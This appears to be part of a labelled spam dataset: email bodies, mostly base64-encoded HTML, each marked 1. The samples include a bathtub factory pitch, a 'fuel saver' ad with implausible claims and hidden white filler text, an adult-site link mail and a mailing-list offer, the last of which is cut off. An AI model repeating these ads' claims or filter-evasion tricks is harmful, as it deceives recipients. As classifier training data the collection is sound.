1,Tm90ZTpJZiB0aGlzIGVhbWlsIGlzIG5vdCBmaXQgZm9yIHlvdSxwbGVhc2UgcmVwbHkgdG8g d2VibWFzdGVyQHdqanp6cy5jb20gd2l0aA0KInJlbW92ZSIuDQpXZSBkb24ndCBpbnRlbmQg dG8gc2VuZCBzcGFtIGVtYWlsIHRvIHlvdS5UaGFuayB5b3UhDQoNCkRlYXIgc2lycyBvciBN YWRhbXMsDQpXZSBhcmUgb25lIEFyY3lsIGJhdGh0dWIgbWFudWZhY3R1cmVyIGluIENoaW5h Lg0KDQotLS0tLS0tLS0tLS0tLS0tLVByb2ZpbGUtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0K DQpPdXIgZmFjdG9yeXNwZWNpYWxpemVzIGluIG1hbnVmYWN0dXJpbmcgobBZRU1BobEgYnJh bmQgYWNyeWxpYyBjb21wb3NpdGUgYmF0aHR1YnMsDQp3ZSBoYXZlIG1vcmUgdGhhbiAxMCB5 ZWFycyBleHBlcmllbmNlIG9mIGJhdGh0dWIgbWFudWZhY3R1cmluZyBhbmQgbWFya2V0aW5n Lg0KV2l0aCBvdXIgY29uc2lkZXJhYmxlIGV4cGVyaWVuY2Ugd2Ugc2V0IG91dCB0byBibGVu ZCB0aGUgYWR2YW50YWdlcyBvZiBhbGwgdGhlIG90aGVyDQpvZiBiYXRodHVicyBvZmZlcmVk IGluIHRoZSBtYXJrZXQgcGxhY2UgaW50byBvbmUgcmFuZ2UuIEFmdGVyIHNldmVyYWwgeWVh cnMgZGV2ZWxvcG1lbnQNCndlIHByb2R1Y2VkIG91ciBjdXJyZW50IHJhbmdlIGFuZCB0aGUg WUVNQSBicmFuZCBiYXRodHViIHdhcyBwYXRlbnRlZCBpbiAyMDAxLiBXZSB3ZXJlDQpldmVu IGF3YXJkZWQgdGhlICJHb2xkIE1lZGFsIiBpbiB0aGUgIkNoaW5lc2UgUGF0ZW50IFRlY2hu b2xvZ3kgRXhoaWJpdGlvbiIgYW5kDQoiVGhlIE5pbnRoIENoaW5lc2UgTmV3IFBhdGVudCBU ZWNobm9sb2d5IGFuZCBOZXcgUGF0ZW50IFByb2R1Y3QgRXhoaWJpdGlvbiIgbGF0ZXIgdGhh dCB5ZWFyLg0KVGhlIFlFTUEgYmF0aHR1YnMgc3RydWN0dXJhbCBkZXNpZ24gaXMgdGhhdCBv ZiBhIG5vcm1hbCBhY3J5bGljIGJhdGh0dWIgYnV0IGNvbmdsdXRpbmF0ZWQNCmludG8gYSBj b21wb3NpdGUgbWF0ZXJpYWwuIEl0IGlzIHJpZGdlZCBhbmQgaXMgbWFkZSBtb3JlIHRoYW4g dHdpY2UgYXMgdGhpY2sgYXMgYSBub3JtYWwNCnVuaXQsIG1ha2luZyBpdCBtb3JlIHNtb290 aCwgZ2VudGxlIGFuZCBlbGVnYW50LiBUaGlzIG1hbnVmYWN0dXJpbmcgdGVjaG5pcXVlIG5v dCBvbmx5DQpwcm92aWRlcyBhbGwgdGhlIGFkdmFudGFnZXMgb2YgYSBub3JtYWwgYWNyeWxp YyBiYXRodHViIChlYXNpbHkgdG8gY2xlYW4sIHJlc2lzdGFuY2UgdG8NCmRpcnQsIGNvbG9y ZnVsLGF0dHJhY3RpdmUgZXRjKSBidXQgYWxzbyBwcm92aWRlcyBpbmNyZWFzZWQgaGVhdCBy ZXRlbnRpb24sIGFuZCBleHRlbmRzDQp0aGUgcHJvZHVjdHMgbGlmZSBzcGFuLg0KDQpCZXNp ZGVzIG91ciBwcm9kdWN0cyBvbiB3ZWJzaXRlLCB3ZSBub3cgcHJvZHVjZSBzb21lIG5ldyBt b2RlbHMgZm9yIFVTQSBtYXJrZXQuDQpXZSBhbHNvIHByb2R1Y2Ugc2hvd2VyIHBhbmVscyB3 aXRoIGZpbmVzdCBxdWFsaXR5Lg0KDQotLS0tLS0tLS0tLS0tLS0tLS0tYmF0aHR1YiBTcGVj aWZpY2F0aW9ucy0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KMSxXYWxsIHRoaWNrbmVzczoxMG1t fjIwbW0NCjIsV2VpZ2h0OiA1MH42MEtHDQoNCi0tLS0tLS0tLS0tLS0tLS0tLS1Db29wZXJh dGUtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KDQpXZSB3b3VsZCBsaWtlIHRv IGJlIHlvdXIgT0VNL09ETSBtYW51ZmFjdHVyZXIuDQoNCkZvciBkZXRhaWxlZCBpbmZvLCBw bGVhc2UgYnJvd3NlIG91ciB3ZWJzaXRlIGh0dHA6Ly93d3cud2pqenpzLmNvbQ0KDQpCZXN0 IHdpc2hlcyBhbmQgcmVnYXJkcywNCg0KRXhwb3J0IE1hbmFnZXINCkplcnJ5IExlZQ0KTW9i aWxlOjEzOTUxMjI4NTYxDQpQaG9uZTowMDg2LTUxOS01MjExOTczDQpGYXg6ICAwMDg2LTUx OS01MjA5Nzc2DQpXdWppbiBIdWFuZ2xpIENvbXBvc2l0ZWQgU2FuaXRhcnkgRmFjdG9yeQ0K QWRkOkhVYW5nbGkgdG93bixXdWppbiBjb3VudHkNCiAgICBDaGFuZ3pob3UgMjEzMTUxDQog ICAgSmlhbmdzdSBwcm92aW5jZQ0KICAgIFAuUi5DaGluYQ0KV2Vic2llOmh0dHA6Ly93d3cu d2pqenpzLmNvbQ0KRW1haWw6d2pqenpzQHdqanp6cy5jb20NCg0KICAgIA==,
1,PGh0bWw+DQoNCjxoZWFkPg0KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1MYW5ndWFnZSIgY29u dGVudD0iemgtdHciPg0KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0 ZXh0L2h0bWw7IGNoYXJzZXQ9YmlnNSI+DQo8bWV0YSBuYW1lPSJHRU5FUkFUT1IiIGNvbnRlbnQ9 Ik1pY3Jvc29mdCBGcm9udFBhZ2UgNC4wIj4NCjxtZXRhIG5hbWU9IlByb2dJZCIgY29udGVudD0i RnJvbnRQYWdlLkVkaXRvci5Eb2N1bWVudCI+DQo8dGl0bGU+pL2qqbxzp2mrSL1kqNI8L3RpdGxl Pg0KPC9oZWFkPg0KDQo8Ym9keT4NCg0KPHAgc3R5bGU9Im1hcmdpbi10b3A6IDA7IG1hcmdpbi1i b3R0b206IDAiPjxmb250IGNvbG9yPSIjODA4MDgwIj6zb6xPqWWwVaXRsU23frxzp2mkvaVxpU61 b6TFqr2xtaZeq0i1TKprsbWmrCAgICAgDQrL5yB+ICE8L2ZvbnQ+PC9wPiAgICANCg0KPGhyIHNp emU9IjEiPg0KPGRpdiBhbGlnbj0iY2VudGVyIj4NCiAgPGNlbnRlcj4NCiAgPHRhYmxlIGJvcmRl cj0iMCIgd2lkdGg9IjYwNiIgaGVpZ2h0PSIzNjUiIGNlbGxzcGFjaW5nPSIwIiBjZWxscGFkZGlu Zz0iMCIgc3R5bGU9ImJvcmRlcjogMiBkb3R0ZWQgI0ZGOTkzMyI+DQogICAgPHRyPg0KICAgICAg PHRkIHdpZHRoPSI2MDAiIGhlaWdodD0iMzY1IiB2YWxpZ249Im1pZGRsZSIgYWxpZ249ImNlbnRl ciIgYmdjb2xvcj0iI0U2RkZGMiI+PGZvbnQgc2l6ZT0iNCI+PGI+PGZvbnQgY29sb3I9IiMwMDgw ODAiPrRNp+TCvaitvve3fLbcoUg8L2ZvbnQ+PGZvbnQgY29sb3I9IiM4MDAwMDAiPqazuGfA2cCj pE+23KFIoUg8L2ZvbnQ+PGZvbnQgY29sb3I9IiM4MDgwMDAiPrdRvtams6bbpHaquqjGt3623KFI oUihSDwvZm9udD48L2I+PC9mb250Pg0KICAgICAgICA8cD4mbmJzcDs8Yj48Zm9udCBjb2xvcj0i I2ZmMDBmZiIgc2l6ZT0iNyI+p088L2ZvbnQ+PGZvbnQgY29sb3I9IiNmZjAwMDAiIHNpemU9IjYi PsNousOhSaFJp0u2T711pFe8dqT5pd+nWbHQp0GmcKbzsLWo7KzdwLSkRrROr+A8L2ZvbnQ+PGZv bnQgY29sb3I9IiNmZjY2MDAiIHNpemU9IjciPqfvxdynQaq6pEClzTwvZm9udD48L2I+PC9wPg0K ICAgICAgICA8cD48Zm9udCBzaXplPSI1Ij4mbmJzcDs8L2ZvbnQ+PGEgaHJlZj0iaHR0cDovL2Rp bW9uLmg4aC5jb20udHcvIj48Yj48dT48c3BhbiBzdHlsZT0iQkFDS0dST1VORC1DT0xPUjogIzAw MDBmZiI+PGZvbnQgY29sb3I9IiNmZmZmMDAiIHNpemU9IjUiPr11pFe8dqT5PC9mb250Pjwvc3Bh bj48L3U+PC9iPjwvYT48L3A+DQogICAgICAgIDxwPqFAPC90ZD4NCiAgICA8L3RyPg0KICA8L3Rh YmxlPg0KICA8L2NlbnRlcj4NCjwvZGl2Pg0KPGhyIHNpemU9IjEiPg0KPHAgYWxpZ249ImNlbnRl ciIgc3R5bGU9Im1hcmdpbi10b3A6IDA7IG1hcmdpbi1ib3R0b206IDAiPjxmb250IGNvbG9yPSIj RkYwMDAwIj6mcKazpbTCWr3QqKO9zKFBpKO3UaZBpqyo7Ka5q0i90Kv2Jm5ic3A7ICAgDQotJmd0 OyZuYnNwOyAoPGEgaHJlZj0iaHR0cDovL3gtbWFpbC5oOGguY29tLnR3IiB0YXJnZXQ9Il9ibGFu ayI+qdqmrLxzp2k8L2E+KTwvZm9udD48L3A+IA0KDQo8L2JvZHk+DQoNCjwvaHRtbD4=,
1,PGh0bWw+PGJvZHk+PHRhYmxlIGJvcmRlcj0iMyIgd2lkdGg9IjgzJSIgaGVp Z2h0PSIxODYiIGNlbGxzcGFjaW5nPSI0IiBjZWxscGFkZGluZz0iNCIgYm9y ZGVyY29sb3I9IiMwMDAwODAiPg0KICA8dHI+PHRkIHdpZHRoPSIxMDAlIiBo ZWlnaHQ9IjEiIGNvbHNwYW49IjIiIGJnY29sb3I9IiNGRkZGMDAiPg0KICAg ICAgPHAgYWxpZ249ImNlbnRlciI+PGI+PGZvbnQgc2l6ZT0iNSIgZmFjZT0i QXJpYWwgQmxhY2siPjxpbWcgYm9yZGVyPSIwIiBzcmM9Imh0dHA6Ly84MS45 LjguNDAvaW1hZ2VzL25venpsZS5qcGciIGFsaWduPSJsZWZ0Ij48L2ZvbnQ+ PC9iPjxwIGFsaWduPSJjZW50ZXIiPiZuYnNwOzxwIGFsaWduPSJjZW50ZXIi PjxiPjxmb250IHNpemU9IjUiIGZhY2U9IkFyaWFsIEJsYWNrIj5JbmNyZWFz ZQ0KICAgICAgWW91ciBHYXMgTWlsZWFnZTwvZm9udD48Zm9udCBzaXplPSI1 IiBmYWNlPSJBcmlhbCBCbGFjayI+PGJyPmJ5IHVwIHRvIDI3JQ0KICAgICAg ISE8L2ZvbnQ+PC9iPjwvdGQ+PC90cj48dHI+DQogICAgPHRkIHdpZHRoPSI1 NSUiIGhlaWdodD0iOTkiPjxiPjxmb250IGZhY2U9IkFyaWFsIiBzaXplPSIy Ij4qIE5vIFRPT0xTDQogICAgICByZXF1aXJlZCEmbmJzcDs8YnI+KiBJbXBy b3ZlcyBQb3dlcjxpbWcgYm9yZGVyPSIwIiBzcmM9Imh0dHA6Ly84MS45Ljgu NDAvaW1hZ2VzL2YtMzUwZC5naWYiIGFsaWduPSJyaWdodCIgd2lkdGg9IjEy NSIgaGVpZ2h0PSI2NyI+PGJyPiogTWF4aW1pemVzIEVuZXJneTxicj4NCiAg ICAgICogSW1wcm92ZXMgTWlsZWFnZSZuYnNwOzxicj4qIEltcHJvdmVzIFRv cnF1ZSZuYnNwOzxicj4NCiAgICAgICogQ2xlYW5lciBFbmdpbmUmbmJzcDs8 YnI+KiBTbW9vdGhlciBFbmdpbmUmbmJzcDs8YnI+DQogICAgICAqIFJlZHVj ZXMgRW1pc3Npb25zIGJ5IDQzJSZuYnNwOzxicj4qIFByb3RlY3RzIENhdGFs eXRpYyBDb252ZXJ0ZXJzJm5ic3A7PGJyPiogUHJldmVudHMgRGllc2VsIEdl bGxpbmcmbmJzcDs8YnI+DQogICAgICAqIEltcHJvdmVzIFNwYXJrIFBsdWcg TGlmZSZuYnNwOzxicj4qIE1haW50ZW5hbmNlIEZyZWU8YnI+KiBQYXlzIGZv ciBJdHNlbGYgd2l0aGluIDYwIGRheXMhPC9mb250PjwvYj48L3RkPg0KICAg IDx0ZCB3aWR0aD0iNDUlIiBoZWlnaHQ9Ijk5Ij48Yj48Zm9udCBmYWNlPSJB cmlhbCI+PGZvbnQgc2l6ZT0iNCI+PHU+SW5zdGFsbHMNCiAgICAgIGluIFNl Y29uZHMhPC91PjwvZm9udD48YnI+PGZvbnQgc2l6ZT0iMyI+QSBzaW1wbGUg ZGV2aWNlIHRoYXQgZWFzaWx5IHNuYXBzIG92ZXIgeW91ciBmdWVsIGxpbmUu PC9mb250PiZuYnNwOyBBbnlvbmUgY2FuIGRvIGl0ITxicj4NCiAgICAgIDwv Zm9udD48L2I+PHA+PGZvbnQgc2l6ZT0iNCIgZmFjZT0iQXJpYWwiPjxiPjx1 Pkd1YXJhbnRlZWQ8L3U+PC9iPjwvZm9udD48Zm9udCBmYWNlPSJBcmlhbCI+ PGI+PGZvbnQgc2l6ZT0iNCI+PHU+ITwvdT48L2ZvbnQ+PGJyPg0KICAgICAg PGZvbnQgc2l6ZT0iMyI+RlVMTCBSRUZVTkQgaWYgeW91IGFyZSBub3Qgc2F0 aXNmaWVkIHdpdGggdGhlIHJlc3VsdCB3aXRoaW4gVEhSRUUgTU9OVEhTIGZy b20gdGhlIGRhdGUgb2YgcHVyY2hhc2UuPC9mb250PjwvYj4NCiAgICAgIDwv Zm9udD48L3A+PHAgYWxpZ249ImNlbnRlciI+PGZvbnQgZmFjZT0iQXJpYWwi IHNpemU9IjMiPjxiPjxhIGhyZWY9Imh0dHA6Ly84MS45LjguNDAvY2dpLWJp bi9mdWVsbWF4L2luZGV4LmNnaT81MzAxNCI+Q0xJQ0sNCiAgICAgIEhFUkU8 L2E+PC9iPjwvZm9udD48L3RkPjwvdHI+PHRyPg0KICAgIDx0ZCB3aWR0aD0i MTAwJSIgaGVpZ2h0PSI5OSIgY29sc3Bhbj0iMiI+DQo8cCBhbGlnbj0iY2Vu dGVyIj48Zm9udCBzaXplPSIxIj48Zm9udCBmYWNlPSJhcmlhbCwgaGVsdmV0 aWNhIj5IT1cgVE8NClVOU1VCU0NSSUJFOjxicj4NCllvdSByZWNlaXZlZCB0 aGlzIGUtbWFpbCBiZWNhdXNlIHlvdSBhcmUgcmVnaXN0ZXJlZCBhdCBvbmUg b2Ygb3VyIFdlYiBzaXRlcywgb3INCm9uIG9uZSBvZiBvdXIgcGFydG5lcnMn IHNpdGVzLjxicj4NCiZuYnNwO0lmIHlvdSBkbyBub3Qgd2FudCB0byByZWNl aXZlIHBhcnRuZXIgZS1tYWlsIG9mZmVycywgb3IgYW55IGVtYWlsDQptYXJr ZXRpbmcgZnJvbSB1cyBwbGVhc2UgPC9mb250PjxhIGhyZWY9Imh0dHA6Ly84 MS45LjguNDAvY2dpLWJpbi9mdWVsbWF4L2luZGV4LmNnaT81MzAxNCNyZW1v dmUiIHRhcmdldD0iX2JsYW5rIj5jbGljaw0KaGVyZS48L2E+PC9mb250Pjwv cD48L3RkPg0KICA8L3RyPjwvdGFibGU+PC9ib2R5PjwvaHRtbD4NCjxmb250 IGNvbG9yPSJXaGl0ZSI+DQpCb3kgZnJpZW5kNDk1OVZqZno1LTAyNGt0WVA4 MTk5bk1zajQtMjc0a3lsMzANCg0KNzczOGFjbWoyLTM4NWVBS3I0Nzg2R3h5 bzItMjg2bndvWTEwNjZsaklYOC05NzBZWkxoOTc2NWxWbDU0DQo=,
1,"<html> <body bgcolor=""#7CB5F0""> <a href=""http://teens.xxxfreehosting.com/hotteens/index.html""><img border=""0"" src=""http://members.aol.com/tjoyce/mail_01.gif"" width=""500"" height=""558"" border=0></a><br> <a href=""mailto:flojo@btamail.net.cn""><img border=""0"" src=""http://members.aol.com/tjoyce/mail_02.gif"" width=""500"" height=""42"" border=0> </a> </body> </html> 4623",
1,PGh0bWwgeG1sbnM6bz0idXJuOnNjaGVtYXMtbWljcm9zb2Z0LWNvbTpvZmZpY2U6b2ZmaWNl Ig0KeG1sbnM6dz0idXJuOnNjaGVtYXMtbWljcm9zb2Z0LWNvbTpvZmZpY2U6d29yZCINCnht bG5zPSJodHRwOi8vd3d3LnczLm9yZy9UUi9SRUMtaHRtbDQwIj4NCg0KPGhlYWQ+DQo8bWV0 YSBodHRwLWVxdWl2PUNvbnRlbnQtVHlwZSBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9 d2luZG93cy0xMjUyIj4NCjxtZXRhIG5hbWU9UHJvZ0lkIGNvbnRlbnQ9V29yZC5Eb2N1bWVu dD4NCjxtZXRhIG5hbWU9R2VuZXJhdG9yIGNvbnRlbnQ9Ik1pY3Jvc29mdCBXb3JkIDkiPg0K PG1ldGEgbmFtZT1PcmlnaW5hdG9yIGNvbnRlbnQ9Ik1pY3Jvc29mdCBXb3JkIDkiPg0KPGxp bmsgcmVsPUZpbGUtTGlzdA0KaHJlZj0iLi9UaGUlMjBObyUyMDElMjBCdXNpbmVzc21haWxs aXN0JTIwaW4lMjB0aGUlMjBXb3JsZF9maWxlcy9maWxlbGlzdC54bWwiPg0KPHRpdGxlPlRo ZSBObyAxIEJ1c2luZXNzbWFpbGxpc3QgaW4gdGhlIFdvcmxkPC90aXRsZT4NCjwhLS1baWYg Z3RlIG1zbyA5XT48eG1sPg0KIDxvOkRvY3VtZW50UHJvcGVydGllcz4NCiAgPG86QXV0aG9y PlBhdHJpY2sgTWMgQ2FubjwvbzpBdXRob3I+DQogIDxvOlRlbXBsYXRlPk5vcm1hbDwvbzpU ZW1wbGF0ZT4NCiAgPG86TGFzdEF1dGhvcj5QYXRyaWNrIE1jIENhbm48L286TGFzdEF1dGhv cj4NCiAgPG86UmV2aXNpb24+MjwvbzpSZXZpc2lvbj4NCiAgPG86VG90YWxUaW1lPjIxPC9v OlRvdGFsVGltZT4NCiAgPG86Q3JlYXRlZD4yMDAyLTA3LTE4VDE2OjEyOjAwWjwvbzpDcmVh dGVkPg0KICA8bzpMYXN0U2F2ZWQ+MjAwMi0wNy0xOFQxNjoxMjowMFo8L286TGFzdFNhdmVk Pg0KICA8bzpQYWdlcz4xPC9vOlBhZ2VzPg0KICA8bzpXb3Jkcz4xNTQ8L286V29yZHM+DQog IDxvOkNoYXJhY3RlcnM+ODc5PC9vOkNoYXJhY3RlcnM+DQogIDxvOkNvbXBhbnk+MjFzdG5l dHdvcms8L286Q29tcGFueT4NCiAgPG86TGluZXM+NzwvbzpMaW5lcz4NCiAgPG86UGFyYWdy YXBocz4xPC9vOlBhcmFncmFwaHM+DQogIDxvOkNoYXJhY3RlcnNXaXRoU3BhY2VzPjEwNzk8 L286Q2hhcmFjdGVyc1dpdGhTcGFjZXM+DQogIDxvOlZlcnNpb24+OS4yNzIwPC9vOlZlcnNp b24+DQogPC9vOkRvY3VtZW50UHJvcGVydGllcz4NCjwveG1sPjwhW2VuZGlmXS0tPg0KPHN0 eWxlPg0KPCEtLQ0KIC8qIFN0eWxlIERlZmluaXRpb25zICovDQpwLk1zb05vcm1hbCwgbGku TXNvTm9ybWFsLCBkaXYuTXNvTm9ybWFsDQoJe21zby1zdHlsZS1wYXJlbnQ6IiI7DQoJbWFy Z2luOjBjbTsNCgltYXJnaW4tYm90dG9tOi4wMDAxcHQ7DQoJbXNvLXBhZ2luYXRpb246d2lk b3ctb3JwaGFuOw0KCWZvbnQtc2l6ZToxMi4wcHQ7DQoJZm9udC1mYW1pbHk6IlRpbWVzIE5l dyBSb21hbiI7DQoJbXNvLWZhcmVhc3QtZm9udC1mYW1pbHk6IlRpbWVzIE5ldyBSb21hbiI7 fQ0KaDENCgl7bXNvLXN0eWxlLW5leHQ6Tm9ybWFsOw0KCW1hcmdpbjowY207DQoJbWFyZ2lu LWJvdHRvbTouMDAwMXB0Ow0KCXRleHQtYWxpZ246Y2VudGVyOw0KCW1zby1wYWdpbmF0aW9u OndpZG93LW9ycGhhbjsNCglwYWdlLWJyZWFrLWFmdGVyOmF2b2lkOw0KCW1zby1vdXRsaW5l LWxldmVsOjE7DQoJZm9udC1zaXplOjEyLjBwdDsNCglmb250LWZhbWlseToiVGltZXMgTmV3 IFJvbWFuIjsNCgljb2xvcjpibHVlOw0KCW1zby1mb250LWtlcm5pbmc6MHB0O30NCnAuTXNv VGl0bGUsIGxpLk1zb1RpdGxlLCBkaXYuTXNvVGl0bGUNCgl7bWFyZ2luOjBjbTsNCgltYXJn aW4tYm90dG9tOi4wMDAxcHQ7DQoJdGV4dC1hbGlnbjpjZW50ZXI7DQoJbXNvLXBhZ2luYXRp b246d2lkb3ctb3JwaGFuOw0KCWZvbnQtc2l6ZToyMC4wcHQ7DQoJbXNvLWJpZGktZm9udC1z aXplOjEyLjBwdDsNCglmb250LWZhbWlseToiVGltZXMgTmV3IFJvbWFuIjsNCgltc28tZmFy ZWFzdC1mb250LWZhbWlseToiVGltZXMgTmV3IFJvbWFuIjsNCgljb2xvcjpyZWQ7fQ0KcC5N c29Cb2R5VGV4dCwgbGkuTXNvQm9keVRleHQsIGRpdi5Nc29Cb2R5VGV4dA0KCXttYXJnaW46 MGNtOw0KCW1hcmdpbi1ib3R0b206LjAwMDFwdDsNCgltc28tcGFnaW5hdGlvbjp3aWRvdy1v cnBoYW47DQoJZm9udC1zaXplOjEyLjBwdDsNCglmb250LWZhbWlseToiVGltZXMgTmV3IFJv bWFuIjsNCgltc28tZmFyZWFzdC1mb250LWZhbWlseToiVGltZXMgTmV3IFJvbWFuIjsNCglj b2xvcjojMzM2NkZGO30NCnAuTXNvQm9keVRleHQyLCBsaS5Nc29Cb2R5VGV4dDIsIGRpdi5N c29Cb2R5VGV4dDINCgl7bWFyZ2luOjBjbTsNCgltYXJnaW4tYm90dG9tOi4wMDAxcHQ7DQoJ dGV4dC1hbGlnbjpjZW50ZXI7DQoJbXNvLXBhZ2luYXRpb246d2lkb3ctb3JwaGFuOw0KCWZv bnQtc2l6ZToxOC4wcHQ7DQoJbXNvLWJpZGktZm9udC1zaXplOjEyLjBwdDsNCglmb250LWZh bWlseToiVGltZXMgTmV3IFJvbWFuIjsNCgltc28tZmFyZWFzdC1mb250LWZhbWlseToiVGlt ZXMgTmV3IFJvbWFuIjsNCgljb2xvcjpibHVlOw0KCWZvbnQtd2VpZ2h0OmJvbGQ7DQoJZm9u dC1zdHlsZTppdGFsaWM7fQ0KYTpsaW5rLCBzcGFuLk1zb0h5cGVybGluaw0KCXtjb2xvcjpi bHVlOw0KCXRleHQtZGVjb3JhdGlvbjp1bmRlcmxpbmU7DQoJdGV4dC11bmRlcmxpbmU6c2lu Z2xlO30NCmE6dmlzaXRlZCwgc3Bhbi5Nc29IeXBlcmxpbmtGb2xsb3dlZA0KCXtjb2xvcjpw dXJwbGU7DQoJdGV4dC1kZWNvcmF0aW9uOnVuZGVybGluZTsNCgl0ZXh0LXVuZGVybGluZTpz aW5nbGU7fQ0KQHBhZ2UgU2VjdGlvbjENCgl7c2l6ZTo1OTUuM3B0IDg0MS45cHQ7DQoJbWFy Z2luOjcyLjBwdCA5MC4wcHQgNzIuMHB0IDkwLjBwdDsNCgltc28taGVhZGVyLW1hcmdpbjoz NS40cHQ7DQoJbXNvLWZvb3Rlci1tYXJnaW46MzUuNHB0Ow0KCW1zby1wYXBlci1zb3VyY2U6 MDt9DQpkaXYuU2VjdGlvbjENCgl7cGFnZTpTZWN0aW9uMTt9DQotLT4NCjwvc3R5bGU+DQo8 L2hlYWQ+DQoNCjxib2R5IGxhbmc9RU4tR0IgbGluaz1ibHVlIHZsaW5rPXB1cnBsZSBzdHls ZT0ndGFiLWludGVydmFsOjM2LjBwdCc+DQoNCjxkaXYgY2xhc3M9U2VjdGlvbjE+DQoNCjxw IGNsYXNzPU1zb1RpdGxlPjxzcGFuIHN0eWxlPSdjb2xvcjpibGFjayc+PCFbaWYgIXN1cHBv cnRFbXB0eVBhcmFzXT4mbmJzcDs8IVtlbmRpZl0+PG86cD48L286cD48L3NwYW4+PC9wPg0K DQo8cCBjbGFzcz1Nc29UaXRsZT48c3BhbiBzdHlsZT0nY29sb3I6YmxhY2snPjwhW2lmICFz dXBwb3J0RW1wdHlQYXJhc10+Jm5ic3A7PCFbZW5kaWZdPjxvOnA+PC9vOnA+PC9zcGFuPjwv cD4NCg0KPHAgY2xhc3M9TXNvVGl0bGU+PGI+PHNwYW4gc3R5bGU9J2NvbG9yOmJsYWNrJz5U aGUgTm8gMSBCdXNpbmVzc21haWxsaXN0IGluIHRoZQ0KV29ybGQ8bzpwPjwvbzpwPjwvc3Bh bj48L2I+PC9wPg0KDQo8cCBjbGFzcz1Nc29UaXRsZT48c3BhbiBzdHlsZT0nY29sb3I6Ymxh Y2snPjwhW2lmICFzdXBwb3J0RW1wdHlQYXJhc10+Jm5ic3A7PCFbZW5kaWZdPjxvOnA+PC9v OnA+PC9zcGFuPjwvcD4NCg0KPHAgY2xhc3M9TXNvVGl0bGU+PGI+PGk+PHU+U3BhbSBpcyBh IFNlcmlvdXMgT2ZmZW5jZTxvOnA+PC9vOnA+PC91PjwvaT48L2I+PC9wPg0KDQo8cCBjbGFz cz1Nc29Ob3JtYWwgYWxpZ249Y2VudGVyIHN0eWxlPSd0ZXh0LWFsaWduOmNlbnRlcic+PHNw YW4NCnN0eWxlPSdmb250LXNpemU6MjAuMHB0O21zby1iaWRpLWZvbnQtc2l6ZToxMi4wcHQ7 Y29sb3I6cmVkJz48IVtpZiAhc3VwcG9ydEVtcHR5UGFyYXNdPiZuYnNwOzwhW2VuZGlmXT48 bzpwPjwvbzpwPjwvc3Bhbj48L3A+DQoNCjxwIGNsYXNzPU1zb05vcm1hbCBhbGlnbj1jZW50 ZXIgc3R5bGU9J3RleHQtYWxpZ246Y2VudGVyJz48aT48c3Bhbg0Kc3R5bGU9J2ZvbnQtc2l6 ZToxOC4wcHQ7bXNvLWJpZGktZm9udC1zaXplOjEyLjBwdDtjb2xvcjpibGFjayc+V2FudCB0 byBleHBvc2UNCnlvdXIgPG86cD48L286cD48L3NwYW4+PC9pPjwvcD4NCg0KPHAgY2xhc3M9 TXNvTm9ybWFsIGFsaWduPWNlbnRlciBzdHlsZT0ndGV4dC1hbGlnbjpjZW50ZXInPjxpPjxz cGFuDQpzdHlsZT0nZm9udC1zaXplOjE4LjBwdDttc28tYmlkaS1mb250LXNpemU6MTIuMHB0 O2NvbG9yOmJsYWNrJz5Ib21lIEJhc2VkDQpCdXNpbmVzcyB0byAxMDAwknMgcGVyIGRheS48 bzpwPjwvbzpwPjwvc3Bhbj48L2k+PC9wPg0KDQo8cCBjbGFzcz1Nc29Ob3JtYWwgYWxpZ249 Y2VudGVyIHN0eWxlPSd0ZXh0LWFsaWduOmNlbnRlcic+PHNwYW4NCnN0eWxlPSdmb250LXNp emU6MTguMHB0O21zby1iaWRpLWZvbnQtc2l6ZToxMi4wcHQ7Y29sb3I6YmxhY2snPjwhW2lm ICFzdXBwb3J0RW1wdHlQYXJhc10+Jm5ic3A7PCFbZW5kaWZdPjxvOnA+PC9vOnA+PC9zcGFu PjwvcD4NCg0KPHAgY2xhc3M9TXNvTm9ybWFsIGFsaWduPWNlbnRlciBzdHlsZT0ndGV4dC1h bGlnbjpjZW50ZXInPjxzcGFuDQpzdHlsZT0nZm9udC1zaXplOjE4LjBwdDttc28tYmlkaS1m b250LXNpemU6MTIuMHB0O2NvbG9yOmJsYWNrJz48c3Bhbg0Kc3R5bGU9Im1zby1zcGFjZXJ1 bjogeWVzIj6gPC9zcGFuPio8c3BhbiBzdHlsZT0ibXNvLXNwYWNlcnVuOiB5ZXMiPqANCjwv c3Bhbj5TcGFtIEZyZWU8c3BhbiBzdHlsZT0ibXNvLXNwYWNlcnVuOiB5ZXMiPqAgPC9zcGFu Pio8bzpwPjwvbzpwPjwvc3Bhbj48L3A+DQoNCjxwIGNsYXNzPU1zb05vcm1hbCBhbGlnbj1j ZW50ZXIgc3R5bGU9J3RleHQtYWxpZ246Y2VudGVyJz48c3Bhbg0Kc3R5bGU9J2NvbG9yOmJs dWUnPjwhW2lmICFzdXBwb3J0RW1wdHlQYXJhc10+Jm5ic3A7PCFbZW5kaWZdPjxvOnA+PC9v OnA+PC9zcGFuPjwvcD4NCg0KPGgxPlNwZWNpYWwgb2ZmZXIgZm9yIHRoZSBtb250aCBvZiBK dWx5IDAyPC9oMT4NCg0KPHAgY2xhc3M9TXNvTm9ybWFsIGFsaWduPWNlbnRlciBzdHlsZT0n dGV4dC1hbGlnbjpjZW50ZXInPjxzcGFuDQpzdHlsZT0nY29sb3I6Ymx1ZSc+PCFbaWYgIXN1 cHBvcnRFbXB0eVBhcmFzXT4mbmJzcDs8IVtlbmRpZl0+PG86cD48L286cD48L3NwYW4+PC9w Pg0KDQo8cCBjbGFzcz1Nc29Cb2R5VGV4dDI+PHNwYW4gc3R5bGU9J2NvbG9yOnJlZCc+NiBN b250aCBNZW1iZXJzaGlwICsgRnJlZSBBbnRpIJYNClZpcnVzIFNvZnR3YXJlIG9ubHkgJDI0 Ljk1PG86cD48L286cD48L3NwYW4+PC9wPg0KDQo8cCBjbGFzcz1Nc29Ob3JtYWwgYWxpZ249 Y2VudGVyIHN0eWxlPSd0ZXh0LWFsaWduOmNlbnRlcic+PHNwYW4NCnN0eWxlPSdjb2xvcjpi bHVlJz48IVtpZiAhc3VwcG9ydEVtcHR5UGFyYXNdPiZuYnNwOzwhW2VuZGlmXT48bzpwPjwv 